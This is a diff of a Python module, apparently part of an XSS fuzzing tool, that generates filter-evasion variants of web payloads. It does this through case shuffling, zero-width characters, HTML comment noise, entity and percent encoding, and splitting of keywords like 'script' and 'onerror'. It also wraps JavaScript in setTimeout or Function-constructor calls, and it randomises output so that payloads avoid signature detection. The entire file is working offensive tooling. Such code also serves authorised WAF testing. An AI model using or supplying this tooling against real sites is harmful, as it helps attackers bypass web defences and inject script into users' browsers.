@@ -1,143 +1,149 @@
+# SPDX-License-Identifier: MIT
+# -*- coding: utf-8 -*-
+"""
+Evasion transforms for WAF/filters.
+All code/comments in English. No line-continuation backslashes or invalid escapes.
+"""
+
+from __future__ import annotations
 import random
 import re
-from typing import Iterable
+from typing import Iterable, List
 
-# Common whitespace variants (including non-ASCII)
-WS = [" ", "\t", "\n", "\r", "\f", "\v", "\u00A0", "\u2009", "\u200A", "\u200B", "\u200C", "\u200D"]
+# Zero-width characters often tolerated by parsers but ignored by many filters
+ZERO_WIDTH = ["\u200b", "\u200c", "\u200d"]
 
-HTML_COMMENTS = ["<!--x-->", "<!--0-->", "<!---->"]
-JS_COMMENTS = ["/**/", "/*0*/", "//x\n"]
+# Words that commonly trigger filters; we will mutate them
+KEYWORDS = [
+    "script", "onerror", "onload", "onmouseover", "onfocus", "oninput",
+    "onclick", "onmouseenter", "onmouseleave", "alert", "prompt", "confirm",
+    "javascript", "srcdoc"
+]
 
-KEYWORDS = ["script", "onload", "onerror", "onclick", "onfocus", "onmouseover", "svg", "img", "iframe"]
-
-def _rand(seq: Iterable[str]) -> str:
-    seq = list(seq)
-    return seq[random.randrange(len(seq))] if seq else ""
-
-def case_shuffle(s: str, prob: float = 0.5) -> str:
+def case_shuffle(s: str, p: float = 0.45) -> str:
+    """Randomly toggle case of letters (keeps digits/symbols)."""
     out = []
     for ch in s:
-        if ch.isalpha() and random.random() < prob:
-            out.append(ch.upper() if random.random() < 0.5 else ch.lower())
+        if ch.isalpha() and random.random() < p:
+            out.append(ch.upper() if ch.islower() else ch.lower())
         else:
             out.append(ch)
     return "".join(out)
 
-def insert_ws_noise(s: str, density: float = 0.15) -> str:
-    out = []
-    for ch in s:
-        out.append(ch)
-        if random.random() < density:
-            out.append(_rand(WS))
+def insert_zero_width(s: str, density: float = 0.20) -> str:
+    """Insert zero-width chars between alphanumerics with given probability."""
+    out = [s[0]] if s else []
+    for i in range(1, len(s)):
+        prev, cur = s[i - 1], s[i]
+        if prev.isalnum() and cur.isalnum() and random.random() < density:
+            out.append(random.choice(ZERO_WIDTH))
+        out.append(cur)
     return "".join(out)
 
-def insert_comment_noise(s: str, density: float = 0.2) -> str:
-    # Try to inject comments between tokens and around keywords
-    def repl_keyword(m):
-        word = m.group(0)
-        chars = list(word)
-        out = []
-        for c in chars:
-            out.append(c)
-            if random.random() < 0.35:
-                out.append(_rand(HTML_COMMENTS + JS_COMMENTS))
-        return "".join(out)
-    # keyword split
-    for kw in KEYWORDS:
-        s = re.sub(kw, repl_keyword, s, flags=re.IGNORECASE)
-    # general token spacing
-    if random.random() < density:
-        s = s.replace("=", _rand(JS_COMMENTS) + "=" + _rand(HTML_COMMENTS))
-    return s
+def html_comment_noise(s: str, every: int = 5) -> str:
+    """
+    Insert HTML comment markers as noise between chunks.
+    Keeps semantics in many HTML parsing paths.
+    """
+    if not s:
+        return s
+    chunks = [s[i : i + every] for i in range(0, len(s), every)]
+    return "<!--x-->" + "<!--x-->".join(chunks)
 
-def html_entity_mangle(s: str, ratio: float = 0.25) -> str:
-    # Randomly replace some sensitive chars with hex/dec entities
-    mapping = {
-        "<": ["&#60;", "&#x3c;"],
-        ">": ["&#62;", "&#x3e;"],
-        "\"": ["&#34;", "&#x22;"],
+def html_entity_mangle(s: str) -> str:
+    """Mix of named/decimal/hex entities for common meta-chars."""
+    table = {
+        "<": ["&lt;", "&#60;", "&#x3c;"],
+        ">": ["&gt;", "&#62;", "&#x3e;"],
+        '"': ["&quot;", "&#34;", "&#x22;"],
         "'": ["&#39;", "&#x27;"],
         "/": ["&#47;", "&#x2f;"],
         "=": ["&#61;", "&#x3d;"],
         "(": ["&#40;", "&#x28;"],
         ")": ["&#41;", "&#x29;"],
-        ":": ["&#58;", "&#x3a;"],
     }
     out = []
     for ch in s:
-        if ch in mapping and random.random() < ratio:
-            out.append(_rand(mapping[ch]))
+        if ch in table:
+            out.append(random.choice(table[ch]))
         else:
             out.append(ch)
     return "".join(out)
 
-def url_mangle(s: str, ratio: float = 0.3) -> str:
-    # Percent-encode selective chars; don't import urllib to keep it lightweight
-    hexmap = {
-        "<": "%3C", ">": "%3E", "\"": "%22", "'": "%27", " ": "%20", "#": "%23",
-        "%": "%25", "{": "%7B", "}": "%7D", "|": "%7C", "\\": "%5C", "^": "%5E",
-        "~": "%7E", "[": "%5B", "]": "%5D", ";": "%3B", "/": "%2F", "?": "%3F",
-        ":": "%3A", "@": "%40", "=": "%3D", "&": "%26", "$": "%24", "+": "%2B", ",": "%2C"
-    }
-    out = []
-    for ch in s:
-        if ch in hexmap and random.random() < ratio:
-            out.append(hexmap[ch])
-        else:
-            out.append(ch)
-    return "".join(out)
+def url_mangle(s: str) -> str:
+    """
+    Light percent-encoding for selected bytes while keeping punctuation recognizable.
+    Avoids double-encoding. Safe for query/fragment contexts.
+    """
+    def _enc(c: str) -> str:
+        o = ord(c)
+        if c.isalnum():
+            return c
+        if c in "-._~":
+            return c
+        return "%%%02X" % o
+    return "".join(_enc(c) for c in s)
 
-def zero_width_sprinkle(s: str, ratio: float = 0.2) -> str:
-    ZW = ["\u200B", "\u200C", "\u200D"]
-    out = []
-    for ch in s:
-        out.append(ch)
-        if ch.isalpha() and random.random() < ratio:
-            out.append(_rand(ZW))
-    return "".join(out)
+def keyword_split(s: str) -> str:
+    """
+    Split hot keywords with benign separators that browsers often ignore.
+    e.g., 'script' -> 'scr' + '/**/' + 'ipt', 'onerror' -> 'on' + '\n' + 'error'
+    """
+    def _split_word(word: str) -> str:
+        mid = max(1, len(word) // 2)
+        seps = ["/**/", "<!--x-->", "\n", random.choice(ZERO_WIDTH)]
+        return word[:mid] + random.choice(seps) + word[mid:]
 
-def split_keywords(s: str) -> str:
-    # Break sensitive tokens by concatenation-like patterns that browsers often accept in JS strings
-    def breaker(m):
+    def repl(m: re.Match) -> str:
         w = m.group(0)
-        if w.lower() == "script":
-            return "scr" + _rand(JS_COMMENTS + HTML_COMMENTS) + "ipt"
-        if w.lower() == "onerror":
-            return "on" + _rand(JS_COMMENTS + HTML_COMMENTS) + "error"
-        if w.lower() == "onload":
-            return "on" + _rand(JS_COMMENTS + HTML_COMMENTS) + "load"
-        return w[0:2] + _rand(JS_COMMENTS + HTML_COMMENTS) + w[2:]
-    for kw in KEYWORDS:
-        s = re.sub(kw, breaker, s, flags=re.IGNORECASE)
-    return s
+        # preserve original case pattern roughly
+        mutated = _split_word(w.lower())
+        out = []
+        for i, ch in enumerate(mutated):
+            if i < len(w) and w[i].isupper():
+                out.append(ch.upper())
+            else:
+                out.append(ch)
+        return "".join(out)
 
-def wrap_in_settimeout(title_expr: str) -> str:
-    # Return a JS expression that defers execution slightly
-    return f"setTimeout(function(){{{title_expr}}},1)"
+    rx = re.compile(r"(?i)(" + "|".join(re.escape(k) for k in KEYWORDS) + r")")
+    return rx.sub(repl, s)
 
-def function_constructor(title_expr: str) -> str:
-    # Indirect eval via Function constructor
-    code = title_expr.replace(\"'\", \"\\'\")
-    return f"Function('{code}')()"
-
-def compose_evasions(s: str, title_expr: str) -> str:
-    # Pipeline of evasions; randomized to produce polymorphic variants
-    variants = [s]
-    # choose a subset randomly to avoid deterministic signatures
-    funcs = [
-        lambda x: case_shuffle(x, 0.6),
-        lambda x: insert_ws_noise(x, 0.12),
-        lambda x: insert_comment_noise(x, 0.15),
-        lambda x: html_entity_mangle(x, 0.3),
-        lambda x: url_mangle(x, 0.25),
-        lambda x: zero_width_sprinkle(x, 0.15),
-        lambda x: split_keywords(x),
+def delayed_exec_wrappers(js: str) -> List[str]:
+    """Wrap a JS snippet to delay/obfuscate execution."""
+    wrappers = [
+        f"setTimeout(function(){{{js}}},10)",
+        f"Function('','{js.replace(\"'\",\"\\\\'\")}')()",
+        f"(()=>{{{js}}})()",
     ]
-    random.shuffle(funcs)
-    for f in funcs[:random.randint(3, len(funcs))]:
-        variants = [f(v) for v in variants]
-    # Optionally wrap {JSCMD}
-    if "{JSCMD}" in variants[0] and random.random() < 0.7:
-        wrapped = _rand([wrap_in_settimeout(title_expr), function_constructor(title_expr)])
-        variants = [v.replace("{JSCMD}", wrapped) for v in variants]
-    return variants[0]
+    return wrappers
+
+# ---------- public API expected by mutator.py ----------
+
+def apply_all(payload: str) -> List[str]:
+    """
+    Generate a small set of polymorphic variants for a given payload.
+    Order is stable but content is randomized.
+    """
+    variants = [
+        payload,
+        case_shuffle(payload),
+        insert_zero_width(payload),
+        html_comment_noise(payload),
+        html_entity_mangle(payload),
+        url_mangle(payload),
+        keyword_split(payload),
+    ]
+
+    # add delayed wrappers when looks like pure JS
+    if re.search(r"[;(){}=]", payload):
+        variants.extend(delayed_exec_wrappers(payload))
+
+    # de-dup preserving order
+    seen = set()
+    uniq: List[str] = []
+    for v in variants:
+        if v not in seen:
+            uniq.append(v)
+            seen.add(v)
+    return uniq
